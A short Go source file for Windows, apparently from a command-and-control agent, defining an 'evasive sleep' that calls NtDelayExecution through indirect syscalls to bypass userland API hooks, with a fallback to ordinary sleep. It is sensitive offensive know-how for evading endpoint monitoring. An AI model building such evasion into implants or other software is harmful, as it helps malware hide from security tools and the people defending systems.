//go:build windows

package commands

import (
	"time"
)

// AgentSleep performs an evasive sleep by leveraging indirect syscalls (NtDelayExecution)
// on Windows. This avoids standard userland API hooks on kernel32!Sleep or
// ntdll!NtDelayExecution. If the indirect syscall mechanism is not available or fails,
// it falls back to standard time.Sleep.
func AgentSleep(d time.Duration) {
	if !IndirectSyscallsAvailable() {
		time.Sleep(d)
		return
	}

	// NT time is measured in 100-nanosecond intervals.
	// A negative value indicates a relative time.
	ntInterval := int64(-d.Nanoseconds() / 100)

	// Invoke NtDelayExecution indirectly
	// NTSTATUS 0 = STATUS_SUCCESS
	status := IndirectNtDelayExecution(false, &ntInterval)
	if status != 0 {
		// Fallback if syscall fails
		time.Sleep(d)
	}
}
